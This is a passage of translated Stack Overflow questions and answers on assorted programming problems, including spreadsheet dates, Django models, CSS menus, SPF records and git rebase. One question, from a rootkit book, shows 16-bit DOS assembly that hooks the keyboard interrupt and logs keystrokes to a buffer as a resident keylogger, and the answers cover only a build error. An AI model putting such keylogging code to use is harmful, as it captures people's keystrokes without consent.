这是一个主观的答案，但在以下情况下，我个人会在字典上使用数组：

1.  所有枚举成员的基础值都是连续的。如果值之间存在很大差距，则使用数组将是不直观的（并且会浪费内存），例如：

    `enum MyEnum { Units, Tens = 10, Hundreds = 100, }`

2.  All enumeration members will always have a value in the structure. If they don't, then the dictionary would provide more intuitive semantics for checking for the presence of a particular key through its `TryGetValue` method. (That said, you could alternatively use `null` to indicate absence if the values are a reference type.)

# mysql - Openoffice-calc 无法更改列的日期格式

> ID：13429787
> 
> 赞同：0
> 
> 时间：2012-11-17T10:42:29.487
> 
> 标签：mysql, format, openoffice.org, openoffice-calc

在 openoffice calc 中，我打开一个从 Internet 下载的 csv 文件。

其中一列用于日期。日期格式为 dd/mm/yy。它也左对齐（我认为它保存为文本）。

我想将日期格式修改为 yyyy-mm-dd，这样我就可以将其放入我创建的 mysql 表中，并且我在其中有一个数据类型为 date 的列（因此它需要我之前提到的格式）。

因此，我在 openoffice calc 中选择了“日期”列，并尝试将格式从原来的格式更改为我想要的格式。什么都没有发生。完全没有变化。

有什么建议吗？与字符集或类似的东西有什么关系？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-10-12T10:36:57.170

如果您选择一个单元格并查看顶部“公式”框中的单元格内容 - 它是否以单引号开头？这意味着，它作为文本导入。尝试删除引号，日期突然表现为日期（并使用您对该单元格的显示首选项）。

有一个有趣的技巧可以使用搜索和替换来删除这些前导引号。选择您的列，进行搜索和替换，单击更多选项，仅当前选择，使用正则表达式：

```
search ^(.*)$
replace & 
```

在正则表达式中，这意味着`search anything and replace it by itself`. 在 OO 中，这会删除前导引号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T10:53:03.800

你可以只使用 MySQL 的[`STR_TO_DATE()`](http://dev.mysql.com/doc/en/date-and-time-functions.html#function_str-to-date)函数：

```
LOAD DATA INFILE '/path/to/file.csv'
  INTO TABLE my_table
  CHARACTER SET utf8
  FIELDS
    TERMINATED BY ','
    OPTIONALLY ENCLOSED BY '"'
  LINES
    TERMINATED BY '\r\n'
  IGNORE 1 LINES
  (@date, col_a, col_b, etc)
SET
  date_col = STR_TO_DATE(@date, '%d/%m/%Y')
; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-11-28T14:07:43.830

它在导入/打开对话框中，您必须告诉它列是日期，然后一切正常。

# session - symfony2 中的操作前方法

> ID：13429788
> 
> 赞同：2
> 
> 时间：2012-11-17T10:42:41.637
> 
> 标签：session, symfony, remember-me

我想在我的 symfony2 应用程序中编写一个通用代码，该代码应该在调用任何操作方法之前执行。我该怎么做？

在登录成功时，我在会话中存储了一些数据。如果用户稍后使用记住我功能访问应用程序。我想恢复会话数据。常用代码是恢复会话数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T19:26:59.153

您可以使用[JMSAopBundle](https://github.com/schmittjoh/JMSAopBundle/blob/master/Resources/doc/index.rst)，拦截给定控制器（或任何控制器）的所有操作方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T08:22:42.927

文档中提供了在过滤器之前和之后设置的方法。请参阅链接[http://symfony.com/doc/2.0/cookbook/event_dispatcher/before_after_filters.html](http://symfony.com/doc/2.0/cookbook/event_dispatcher/before_after_filters.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-17T11:27:59.233

我认为[https://github.com/symfony/symfony/issues/1975](https://github.com/symfony/symfony/issues/1975)会有所帮助。基本上，您必须创建侦听器，该侦听器将在`kernel.controller`事件中侦听并从那里的控制器调用某些方法。

# php - 为什么箭头不适用于pdf？

> ID：13429790
> 
> 赞同：1
> 
> 时间：2012-11-17T10:42:57.843
> 
> 标签：php, dompdf

我正在尝试使用 dompdf 将 html 转换为 pdf。每件事都运行良好。我的代码在我的 html 中有向上和向下箭头，例如 `&uarr;` `&darr;`. 这些在 html 上运行良好。

但在pdf文件转换后，这些只是看 `?` 。

我正在使用版本 dompdf_0-6-0_beta3

我怎么能解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-11T02:41:23.787

These particular characters are not supported by the default encoding scheme, which is Windows ANSI. You'll need a Unicode font, plus the correct document format. Luckily 0.6.0 beta 3 includes the DejaVu fonts, which work just fine.

Try: `<span style="font-family: DejaVu Sans, sans-serif;">&uarr; &darr;</span>`

And ensure that you're set up for Unicode support. I think you should be OK with your version of dompdf, but it never hurts to know the requirements. You can find an [Unicode How-to on the wiki](https://github.com/dompdf/dompdf/wiki/UnicodeHowTo). The information is currently out of date with 0.6.0 beta 3, but it is a useful document none-the-less.

# ruby-on-rails - 将类似 Bootstrap 的框架集成到 Rails 应用程序中

> ID：13429792
> 
> 赞同：0
> 
> 时间：2012-11-17T10:43:14.443
> 
> 标签：ruby-on-rails, twitter-bootstrap

我想在我的 Rails 应用程序中使用[PlusStrap 框架。](http://xbreaker.github.com/plusstrap/)正如我所见，它是一个稍微定制的引导程序。

我在布局中包含了 css 文件：

```
<%= stylesheet_link_tag    "plusstrap.min.css" %> 
```

但是当我查看这个 CSS 文件时，我发现了这样的图像参考：

```
background-image: url("../img/glyphicons-halflings.png"); 
```

我创建了 assets/img 文件夹并将图像文件放入其中，但 Rails 找不到这些图像。我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:49:09.693

CSS 的 url 调用引用的包含任何内容的正确方法是：

```
background-image: url("/images/yourpic.png") 
```

Rails 框架以一种特殊的方式处理它......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:45:15.690

检查您的文件夹结构，它真的指向图像吗？检查文档以获取 rails 中的相对路径。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-18T16:03:49.930

如果您不想修改 css 文件，则可以将其放在一个文件夹中，例如`app/assets/stylesheets/plusstrap/plusstrap.min.css`，将图像放入其中，`app/assets/images/img/`这样您就可以使用以下命令调用 css：

```
<%= stylesheet_link_tag "plusstrap/plusstrap.min.css" %> 
```

我知道，这可能是多余的，但如果您想将 css 保留为原始内容，这是一种有效的方法。

# django - Django - 如何为注册站点用户和非站点用户创建模型？

> ID：13429793
> 
> 赞同：5
> 
> 时间：2012-11-17T10:43:27.160
> 
> 标签：django, django-admin, django-authentication

我有一个`Trip`模型，它可以让许多参与者订阅给定的旅行和一个所有者。参与者是在网站上注册的用户，但我还希望能够将“离线”用户添加到旅行中，即在网站上没有帐户的用户，这样我就可以跟踪所有来的用户。所有者和参与者都链接到 Userena 用户配置文件（附带问题：也许直接链接到`User`会更好？但是我如何让 full_name 看到在内联管理员中的选择？）

```
class Trip(models.Model):
    name = models.CharField('trip name', max_length=200)
    type = models.ForeignKey(Category, related_name='categories')
    .
    .
    .
    slug = models.SlugField('trip slug', max_length=100)
    owner = models.ForeignKey(UserProfile, related_name='owner')
    participants = models.ManyToManyField(UserProfile, blank=True, null=True, related_name='participants')
    is_public = models.BooleanField("is visible?",db_index=True)

class ParticipationInline(admin.TabularInline):
    model = Trip.participants.through
    extra = 3

class TripAdmin(admin.ModelAdmin):

    def formfield_for_dbfield(self, db_field, **kwargs):
        if db_field.name in ('desc',):
            return db_field.formfield(widget=TinyMCE(
                attrs={'cols': 100, 'rows': 20},
                mce_attrs={'external_link_list_url': reverse('tinymce.views.flatpages_link_list')},
            ))
        return super(TripAdmin, self).formfield_for_dbfield(db_field, **kwargs)
    inlines = [
        ParticipationInline,
        ]
    exclude = ('participants',)
    prepopulated_fields = {"slug": ("name",)}
    list_display = ('name', 'type', 'date', 'dest','owner', 'is_public')
    list_filter = ['date', 'type']
    search_fields = ['name', 'dest', 'desc']
    date_hierarchy = 'date'

    class Media:
        js = ('js/tiny_mce/tiny_mce.js',
              'js/tiny_mce/textareas.js',)

admin.site.register(Trip, TripAdmin) 
```

因此，当我`Trip`通过管理界面添加时，我想首先从现有注册用户中选择一个参与者，如果我在那里找不到他们，我希望能够内联添加一个新的“离线”参与者。实现这一目标的最佳方法是什么？

1.  有两个配置文件继承自我的`UserProfile`?
2.  有一个单独的离线用户模型和两个多对多关系`Trip`？
3.  有更好的办法吗？

**在 Hedde 的评论后**编辑。****

 **我`OfflineUser`按照 GenericRelation 的建议创建了我的`Trip`：

```
class OfflineUser(models.Model):
    first_name = models.CharField(_('first'), max_length=30)
    last_name = models.CharField(_('last'), max_length=30)
    ...
    content_type = models.ForeignKey(ContentType)
    object_id = models.PositiveIntegerField()
    content_object = generic.GenericForeignKey("content_type", "object_id")    

class Trip(models.Model):
    ...
    owner = models.ForeignKey(UserProfile, related_name='owner')
    participants = models.ManyToManyField(UserProfile, blank=True, null=True, related_name='participants')
    offline_users = generic.GenericRelation(OfflineUser) 
```

添加后，`OfflineUserInline`我可以将注册用户和离线用户添加到我的`Trip`！然后我可以像这样列出这`Trip`两种类型的参与者：

```
{% if request.user.is_staff %}
        <ul>
            {% for participants in object.participants.all %}
                <li> {{ participants.full_name }}
                </li>
            {% empty %}
                No registered users!
            {% endfor %}
            {% for participants in object.offline_users.all %}
                <li> {{ participants.full_name }}
                </li>
            {% empty %}
                No offline users!
            {% endfor %}
        </ul>
{% endif %} 
```

所以它在一定程度上起作用，现在我有一种奇怪的感觉，我没有完全理解赫德的答案......

每次我想对参与者做某事（数数、列出他们等）时，我需要做两次吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:31:17.157

使用[contenttypes 框架](https://docs.djangoproject.com/en/dev/ref/contrib/contenttypes/)可以使这更容易。您可以从管理员中过滤/隐藏内容类型，并在需要时清理表单或覆盖保存。对于“离线”参与者，我不会创建个人资料，而是模仿，例如：

```
class OfflineUser(models.Model):
    first_name = models.CharField(_('first name'), max_length=30)
    last_name = models.CharField(_('last name'), max_length=30)
    email = models.EmailField(_('e-mail address'))
    # field extensions
    ... = generic.GenericRelation(...)

    def get_profile(self):
        pass

    def get_full_name(self):
        """
        Add some default User methods so you can call them on
        the related_object without raising attribute errors
        """
        full_name = u'%s %s' % (self.first_name, self.last_name)
        return full_name.strip() 
```

现在您可以执行以下操作：

```
{{ some_model.content_object.get_profile.get_full_name }} 
```

有很多 stackoverflow 和谷歌搜索结果可以帮助你，例如

[通用多对多关系](https://stackoverflow.com/questions/933092/generic-many-to-many-relationships)**

# html - 无法在导航标签内设置 ul 样式

> ID：13429797
> 
> 赞同：1
> 
> 时间：2012-11-17T10:44:42.650
> 
> 标签：html, css

我正在尝试为我的网站制作导航菜单，并且一直在使用[http://www.onextrapixel.com/2011/06/03/how-to-create-a-horizo ​​ntal-dropdown-menu-with-html-css -and-jquery/](http://www.onextrapixel.com/2011/06/03/how-to-create-a-horizontal-dropdown-menu-with-html-css-and-jquery/) 作为指南。它运行良好，但是一旦我尝试将（ id="coolMenu" ）添加到导航标签，它就会停止工作。

我将它从 ul 标签中取出并将其添加到 nav 标签中，但它不再起作用。它根本不显示任何东西。做错了什么？

谢谢。

html代码如下：

```
<nav id="coolMenu">
<ul>
    <li><a href="#">Lorem</a></li>
    <li><a href="#">Mauricii</a></li>
    <li> 
        <a href="#">Periher</a>
            <ul class="noJS">
                <li><a href="#">Hellenico</a></li>
                <li><a href="#">Genere</a></li>
                <li><a href="#">Indulgentia</a></li>
            </ul>
    </li>
    <li><a href="#">Tyrio</a></li>
    <li><a href="#">Quicumque</a></li>
</ul>
</nav> 
```

下面的CSS：

```
/* Structure
------------------------------------------*/
#coolMenu,
#coolMenu ul {
    list-style: none;
}
#coolMenu {
    float: left;
}
#coolMenu > li {
    float: left;
}
#coolMenu li a {
    display: block;
    height: 2em;
    line-height: 2em;
    padding: 0 1.5em;
    text-decoration: none;
}
#coolMenu ul {
    position: absolute;
    display: none;
    z-index: 999;
}
#coolMenu ul li a {
    width: 80px;
}
#coolMenu li:hover ul.noJS {
    display: block; 
}

/* Main menu
------------------------------------------*/
#coolMenu {
    font-family: Arial;
    font-size: 12px;
    background: #2f8be8;
}
#coolMenu > li > a {
    color: #fff;
    font-weight: bold;
}
#coolMenu > li:hover > a {
    background: #f09d28;
    color: #000;
}

/* Submenu
------------------------------------------*/
#coolMenu ul {
    background: #f09d28;
}
#coolMenu ul li a {
    color: #000;
}
#coolMenu ul li:hover a {
    background: #ffc97c;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:56:54.803

你的问题在这里：

```
<nav id="coolMenu">
<ul> 
```

ID标签应该附加到无序列表上，它应该是

```
<nav>
<ul id="coolMenu"> 
```

通过编辑查看您的代码：http: [//jsfiddle.net/UMTGR/1/](http://jsfiddle.net/UMTGR/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T13:51:58.917

问题在这里：

```
#coolMenu ul {
    position: absolute;
    display: none;
    z-index: 999;
} 
```

由于您将 id 放在`nav`元素上，因此 main`ul`设置为`display: none`，而不是 submenu `ul`。如果您想让 id on `nav`，则必须更改所有 css 选择器以反映这一点。

或者，如果你想定位`nav`元素，为什么不给它一个新的 id 并保持其余部分不变呢？

# c# - 如何编辑快捷方式的目标并启动它？

> ID：13429802
> 
> 赞同：1
> 
> 时间：2012-11-17T10:45:47.040
> 
> 标签：c#, target, shortcut

我浏览了一下，找不到任何可以解决这个问题的东西；

我正在使用 ForceBind 强制浏览器使用 wi-fi 连接而不是以太网连接。为了使用 ForceBind 启动浏览器，我使用了一个快捷方式，其目标字段是：

C:\Windows\System32\ForceBindIP.exe 192.168.2.91 "C:\Program Files\Mozilla Firefox 3.6\firefox.exe" （我基本上是在启动 ForceBind 程序并告诉它启动浏览器）

这里的主要问题是每次我连接到无线网络时IP地址都会明显改变（并且由于与这里无关的原因，我无法设置固定地址来尝试从路由器请求），所以我写了下面的代码来获取当前无线适配器的地址：

```
 static void Main(string[] args)
    {
        try
        {
            //Variable declaration
            string adapterName = "";
            string adapterIPAddress = "";
            int num = 0; //assisting var

            NetworkInterface[] interfaceList = NetworkInterface.GetAllNetworkInterfaces();

            for (int i = 0; i < interfaceList.Length; i++) 
            {
                if ((interfaceList[i].NetworkInterfaceType == NetworkInterfaceType.Wireless80211) && (interfaceList[i].OperationalStatus == OperationalStatus.Up)) 
                {
                    adapterName = interfaceList[i].Name; 
                    var ipProperties = interfaceList[i].GetIPProperties(); 
                    foreach (var ip in ipProperties.UnicastAddresses) 
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            adapterIPAddress = ip.Address.ToString();
                        }
                    }
                    num = i;
                    break;
                }
            }
            Console.WriteLine("Adapter name:    " + adapterName);
            Console.WriteLine("Adapter type:    " + interfaceList[num].NetworkInterfaceType);
            Console.WriteLine("Address:         " + adapterIPAddress);
            Console.WriteLine("");

            //Create a string that represents the path with the appropriate IP Address
            ///<   C:\Windows\System32\ForceBindIP.exe xxx.xxx.xxx.xxx "C:\Program Files\Mozilla Firefox 3.6\firefox.exe"   >
            string newPath = "C:/Windows/System32/ForceBindIP.exe " + adapterIPAddress + " \"C:/Program Files/Mozilla Firefox 3.6/firefox.exe\"";
            Console.WriteLine("New path: ");
            Console.WriteLine(newPath);
            Console.WriteLine("Press Enter to launch...");
            Console.ReadLine();

            System.IO.File.Open(newPath, FileMode.Open);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Oh no! Something went wrong! Bummer.", ex.Message);
        }
    } 
```

问题是，在尝试启动 (System.IO.Open...) 时，我收到一个异常，说路径具有非法字符。所以一个。什么是非法字符，如何启动文件，或者 b. 如果我的计算机上有一个现有的快捷方式，我如何让该程序编辑其目标（仅更改 IP 地址）并启动它？

# php - DNS - txt 和 spf 记录 (php mail())

> ID：13429804
> 
> 赞同：2
> 
> 时间：2012-11-17T10:46:05.373
> 
> 标签：php, email, dns, spf

我在 www.syse.no 上有一个 .no 域，我在 us.lt 上有一个主机。问题是，我无法使用 php mail() 函数发送邮件。所有电子邮件都进入垃圾邮件。我在 php.net 上表示我必须配置我的 txt 和 spf 记录，但我不知道该怎么做。也许有人可以帮助我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-25T20:32:39.480

In the DNS entries of your domain www.syse.no you need to add an SPF record containing the IP address of your hosting on us.lt.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-26T05:57:09.297

为您正在使用的域添加 SPF 记录或更新 DNS 中的现有 SPF 记录。假设域是`syse.no`，那么新的 SPF 记录应该是：

```
v=spf1 include:spf.tornado-mail.com include:us.lt ~all 
```

这会将 us.lt 服务器添加为来自该域的电子邮件的允许电子邮件源，并保留现有的经过身份验证的电子邮件源。

# assembly - 编译 16 位汇编代码时出现打开 watcom 错误（找到多个起始地址）

> ID：13429805
> 
> 赞同：1
> 
> 时间：2012-11-17T10:46:10.190
> 
> 标签：assembly, dos, 16-bit, watcom, rootkit

我正在尝试从 open watcom IDE 中的 rootkit 武器库中编译一个 16 位汇编代码片段。它给出了错误“找到多个起始地址”。由于组装知识非常有限，我无法对其进行整理。这是代码：

```
CSEG SEGMENT BYTE PUBLIC 'CODE'
ASSUME CS:CSEG,DS:CSEG,SS:CSEG
ORG 100H

_here:

JMP _main
JMP _overData

_buffer DB 512 DUP('W')
_terminator DB 'Z'
_index DW 0H
_oldISR DD 0H
_chkISR DD 0h
_overData:

_getBufferAddr:

STI
MOV DX, CS
LEA DI,_buffer
IRET

_hookBIOS:

PUSH AX
PUSH BX

PUSHF 
CALL CS:_oldISR

MOV AH, 01H
PUSHF
CALL CS:_chkISR

CLI
PUSH DS 
PUSH CS
POP DS

jz _hb_Exit 
LEA BX,_buffer
PUSH SI
MOV SI,WORD PTR[_index]
MOV DS:[BX+SI],AL
INC SI
MOV WORD PTR[_index], SI
POP SI

_hb_Exit:

POP DS
POP AX
POP BX

STI
IRET

_install:

LEA DX,_getBufferAddr
MOV CX,CS
MOV DS,CX
MOV AH,25H
MOV AL,187
INT 21H

MOV AH,35H
MOV AL,9H
INT 21H
MOV WORD PTR _oldISR[0],BX
MOV WORD PTR _oldISR[2],ES

MOV AH, 35H
MOV AL,16H
INT 21H
MOV WORD PTR _chkISR[0],BX
MOV WORD PTR _chkISR[2],ES

MOV AH,25H
MOV AL,9H
MOV CX,CS
MOV DS,CX
LEA DX,_hookBIOS
INT 21H

RET

PUBLIC _main

_main:

PUSH BP
MOV BP,SP
MOV AX,CS
MOV SS,AX
LEA AX,_localStk
ADD AX,100H

CALL NEAR PTR _install

MOV AH, 31H
MOV AL,0
MOV DX, 200H
INT 21H

POP BP
RET

PUBLIC _localStk
_localStk DB 256 DUP(?)

CSEG ENDS
END _here 
```

请帮帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-06T23:48:25.677

抱歉回复晚了，但我只是想通了这一点，并在另一个 StackOverflow 问题上发布了一个解决方案，询问了一个类似的问题：

[编译实模式 asm (rootkit.arsenal)](https://stackoverflow.com/questions/12426012/compiling-real-mode-asm-rootkit-arsenal/17508080#17508080)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T22:16:13.157

我用 OpenWatcom 构建 .com 文件的方法是用 wasm 编译程序集文件，然后使用 wlink。

```
wasm hello.asm
wlink sys dos com file hello.o 
```

这里的目标文件具有扩展名 .o，这是 wasm 在 Linux 上生成的。在 DOS、Windows 和 OS/2 中，它可能是 .obj，因此请根据您的系统调整命令行。

我在开始时使用 .model tiny 和 .286p 并省略 CSEG 和 ASSUME 行。我想那没关系。

# html - 在 Internet Explorer 中使用以下代码的替代解决方案是什么？

> ID：13429808
> 
> 赞同：0
> 
> 时间：2012-11-17T10:46:33.597
> 
> 标签：html, css

```
<form action="/signup" method="post">
<span class="new" style="vertical-align:middle;">Choose username:</span>
<input type="text" name="username" id="username"/>
<input type="submit" name="signup" value="Check" class="button height"/>
</form> 
```

CSS：

```
#username{
background: url(/image/correct.jpg) no-repeat;
background-position:95% 8px;
background-size:18px;
padding-right: 35px;
vertical-align:bottom;
height:27px;

} 
```

问题是背景大小和背景位置在 Internet Explorer 中不起作用。有什么替代方案？我用了

```
filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(
src='images/correct.jpg',
sizingMethod='scale');

-ms-filter: "progid:DXImageTransform.Microsoft.AlphaImageLoader(
src='image/correct.jpg',
sizingMethod='scale')"; 
```

lz有什么解决办法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:07:43.717

### Internet Explorer 不支持`background-size`！

`background-size`Internet Explorer 不支持该属性。我最好的解决方案是，使用图像编辑器（Paint 或 Photoshop）为图像提供正确的填充、透明或任何背景颜色，然后将背景图像对齐到`right center`.

```
#username{
    background: url(/image/correct.jpg) no-repeat right center;
    padding-right: 35px;
    vertical-align: bottom;
    height: 27px;
} 
```

# git - 合并后Git缺少代码

> ID：13429812
> 
> 赞同：7
> 
> 时间：2012-11-17T10:47:15.653
> 
> 标签：git, github, branching-and-merging, git-rebase

我们的 GitHub 存储库存在问题。我将解释我们的工作流程：

开发人员从主线分支创建功能/错误修复分支。他们拉取他们的更改以将其合并回来。他们可能会从主线分支重新设置基础，以便在他们工作时从中获取最新更新。在 rebase 之后，他们将 --force 推送到他们的功能分支上。

最近使用 GitHub Web 界面自动合并了两个拉取请求。随后 - 在请求合并后大约两天 - 发现这些提交中的更改不在代码中。历史上没有任何迹象表明这些更改被还原或覆盖。合并本身不会出现在提交历史中，并且单个提交本身也不会出现。但是拉取请求已成功合并。缺少的提交之一不再可用于樱桃挑选。当我们尝试时，我们会收到一个致命的 - 坏对象消息。

我们怀疑已经发生了一些历史改写。我们如何才能发现以及如何防止这种情况发生。我们的工作流程是否存在根本性的问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-12-23T15:40:26.480

您面临的问题与您的开发人员从主分支变基然后强制推动他们的分支有关。`git rebase`实际上它会*取消提交*您所做的所有更改，合并主分支，然后*重新应用*您的提交（就像它们是补丁文件一样）。这将创建一个带有全新哈希的全新 git commit。

简而言之，旧的提交丢失了，并创建了一个新的相同提交。

这就是为什么*非常*不鼓励对任何公开的工作进行 rebase，因为你实际上是在改变历史。如果他们的工作基于不再可用的更改，那么任何从你的工作分支出来的人都会有一个非常糟糕的一天。

编辑：提交本身并没有丢失，它仍然存在于您的存储库中。但是，它不再在手头的分支上可用

# mysql - 如何将两个字段相乘然后获得行的平均值

> ID：13429813
> 
> 赞同：0
> 
> 时间：2012-11-17T10:48:14.917
> 
> 标签：mysql, sql, database

我想平均成绩

有一个这样的表（两个表的INNER JOIN）

```
+-------+------+
| grade | unit |
+-------+------+ 
```

我想将（等级和单位）乘以 res

然后，获得 res 的平均值

我可以用 php 来做，但我只需要用一个 sql 来做，结果必须在

一个领域

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:49:17.743

```
SELECT AVG(grade * unit) FROM ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:51:32.257

```
select grade,unit, AVG(grade *unit) as average from ... 
```

# sql - SQL用户定义函数将字符串拆分为多列和多行

> ID：13429814
> 
> 赞同：1
> 
> 时间：2012-11-17T10:48:27.583
> 
> 标签：sql, sql-server

我有`string`格式`'S1CW3733|1050105000224,S1CW4923|1050105000009'`

我在 SQL 中有将其转换为格式的函数

```
item
S1CW3733|1050105000224
S1CW4923|1050105000009 
```

**可以这样做吗？（多列）**

```
item       item2
S1CW3733   1050105000224
S1CW4923   1050105000009 
```

我的功能：-

```
ALTER Function [dbo].[fnSplit]
(
    @sInputList Varchar(8000), -- List of delimited items  
    @sDelimiter VarChar(8000) = ',' -- delimiter that separates items  
) 
Returns @List Table (item VarChar(8000))  
Begin  
 Declare @sItem VarChar(8000)  

 While CharIndex(@sDelimiter,@sInputList,0) <> 0  
  Begin  
   Select   
   @sItem=RTrim(LTrim(SubString(@sInputList,1,CharIndex(@sDelimiter,@sInputList,0)-1))),  
   @sInputList=RTrim(LTrim(SubString(@sInputList,CharIndex(@sDelimiter,@sInputList,0)+Len(@sDelimiter),Len(@sInputList))))  

   If Len(@sItem) > 0  
    Insert Into @List Select @sItem  
 End  

 If Len(@sInputList) > 0  
  Insert Into @List Select @sInputList -- Put the last item in  

 Return  
End 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:55:24.107

好吧，如果你只有两列，你总是可以做到这一点

```
select
    left(f.item, c.c - 1) as item1,
    right(f.item, len(f.item) - c.c) as item12
from dbo.fnSplit('S1CW3733|1050105000224,S1CW4923|1050105000009', ',') as f
    outer apply (select charindex('|', f.item) as c) as c 
```

我没有检查 charindex != 0，所以你可以添加这个检查。

但是，如果您有多个由“|”分隔的列，我认为没有动态 SQL 就没有办法做到这一点

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T11:00:22.893

另一种方式。您可以修改您的功能。该函数必须期望附加参数 - 要返回拆分字符串的哪一部分。因此，在您的 sql 请求中，您将执行以下操作：

```
select
  fnSplit(item, ',', '|', 0) as item_left,
  fnSplit(item, ',', '|', 1) as item_right
from
  mytable 
```

在这种情况下，函数必须看起来像

```
 ALTER Function [dbo].[fnSplit]
    (
        @sInputList Varchar(8000), -- List of delimited items  
        @sDelimiter1 VarChar(8000) = ',', -- delimiter that separates items  
        @sDelimiter2 VarChar(8000) = '|', -- delimiter that separates splitted item
        @which_part int = 0 -- if 0 return left part, 1 -right part
    ) 
    Returns VarChar(8000)
... business login here 
```

# python - 使用 rpy2 绘图时添加图例

> ID：13429821
> 
> 赞同：0
> 
> 时间：2012-11-17T10:49:35.193
> 
> 标签：python, legend, rpy2

我正在尝试使用以下命令绘制 ECDF 但是当我运行脚本时出现此错误

```
1: In rect(left, top, r, b, angle = angle, density = density, ...) :
  supplied color is not numeric nor character
2: In rect(left, top, r, b, angle = angle, density = density, ...) :
  supplied color is not numeric nor character 
```

我的代码是：

```
import rpy2.robjects as robj
ce=robj.FloatVector(range(1,100,1))
le=robj.FloatVector(range(5,500,2))
label="score"
l1="a"
l2="b"

robj.r["plot.ecdf"](ce,main="",verticals=True,pch=46,col="grey",xlab=label)
robj.r["plot.ecdf"](le,verticals=True,pch=46,col="red",add=True)
robj.r.legend("topleft",legend=[l1,l2],fill=["grey","red"]) 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T02:46:57.933

更正调用中的 Python 列表以`legend`. 例如，`fill`应该是`fill=robj.StrVector(["grey", "red"])`

# php - 如何通过电子邮件发送网页？

> ID：13429822
> 
> 赞同：-1
> 
> 时间：2012-11-17T10:49:35.493
> 
> 标签：php, email

我在我的域上创建了一个网页，我希望允许任何访问者通过电子邮件将此页面发送给任何人。

页面有图片、css和php代码。它从我的网站获得前 5 条新闻。

我正在尝试使用这个类：

```
<?php
include_once("../DataAccess.php");
class sendmail
{
    /**
     * @var from mail.
     */
    public $from = "kam@yahoo.com";

    /**
     * @var from name.
     */
    public $fromName = " Mail List";

    /**
     * @var to mail.
     */
    public $to  = 'eng.k@gmail.com'; // note the comma , if you want multiple recipients

    /**
     * @var to name.
     */
    public $name = 'Khaled';

    /**
     * @var subject.
     */
    public $subject = 'Hello World !!';

    /**
     * @var message.
     */
    public $message = 'Thank you, your message has been received We will reply you as soon eng@gmail.com';

    /**
     * @var newlines.
     */
    private $RN = "\r\n";

    /**
     * @var message charset.
     */
    public $charset = 'utf-8';

    /**
     * Sends an email.
     *
     * @author Yousef Ismaeil.
     */
    public function mail_to ()
    {

        $mail = &$this;

        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0'.$mail->RN;
        $headers .= 'Content-type: text/html; charset='.$mail->charset.''.$mail->RN;
        // Additional headers
        $headers .= 'To: '.$mail->name.' <'.$mail->to.'>'.$mail->RN;
        $headers .= 'From: '.$mail->fromName.' <'.$mail->from.'>'.$mail->RN;
        $headers .= 'Return-Path: '.$mail->from.'\r\n';
        $headers .= "X-Priority: 1\r\n";
        $headers .= "X-MSMail-Priority: High\r\n";

        if (@mail($mail->to, $mail->subject, $mail->message, $headers))
        {
            return true;
        }
        else
        {
            return false;
        }

    }

}

$date1=date('Y-m-d');
$send_mail = new sendmail();
$send_mail->from     = "zizo@yahoo.com";
$send_mail->fromName = "Zamalkawy Ana";
$send_mail->to       = "kam@ar.com";
$send_mail->name     = "Khlaed";
$send_mail->subject  = "Zamalkawy Ana Sports news for ".$date1;
$homepage = file_get_contents('http://zamalkawyana.com/MailList/home.php');
$send_mail->message  = $homepage;
if ($send_mail->mail_to()) echo 'Msg sent';
else echo 'Can\'t send msg.'; 

?> 
```

...但是当我发送它时，我只得到新闻的标题和图片，而看不到页面的模板。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:05:02.737

不清楚上面的解释中 $homepage 包含什么。它*可能*是您页面的 html 标记。但是，如果您真的想发送*该*内容，则值得怀疑。

通常做的不是发送实际的 html 内容，而是一个指向页面的链接（url）。由于无论如何都可以通过互联网上的 url 访问您的页面，因此这是一个简单的步骤。

这有一些优点：

1.  消息变得更小，因为它只有几行文本加上链接。它将访问页面或不访问页面的决定留给接收者。

2.  该消息可以在任何电子邮件客户端中显示，而不会出现 html 消息所存在的巨大安全问题。因此，对收件人更公平，因为您不必为了打开来自您的消息而要求任何收件人的最终信任。

3.  您可以写几行关于此消息实际包含的内容、发送原因等。它更友好，因为它更透明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:01:06.900

添加到标题： `$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";`

您可以将 html 代码放在消息正文中（作为字符串）。

也看看这个[链接](http://css-tricks.com/sending-nice-html-email-with-php/)。

# ios - 如何在 iOS 粘贴板中获取数据以保持多重访问

> ID：13429823
> 
> 赞同：1
> 
> 时间：2012-11-17T10:49:55.753
> 
> 标签：ios, nsstring, nsdata, uipasteboard, pasteboard

